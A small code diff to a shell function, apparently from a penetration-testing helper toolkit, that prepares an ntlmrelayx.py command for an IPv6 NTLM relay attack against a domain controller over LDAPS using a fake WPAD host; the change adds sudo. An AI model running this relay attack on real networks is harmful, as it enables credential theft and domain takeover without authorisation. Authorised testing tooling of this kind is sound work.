@@ -30,7 +30,7 @@ nb-ad-ipv6-ntlmrelayx() {
 	  __ask "Enter the IP address of the target DC server"
 	  nb-vars-set-rhost
 
-    print -z "ntlmrelayx.py -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__hostpath)/ntlmrelayx"
+    print -z "sudo ntlmrelayx.py -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l $(__hostpath)/ntlmrelayx"
 }
 
 nb-ad-ipv6-mitm6() {
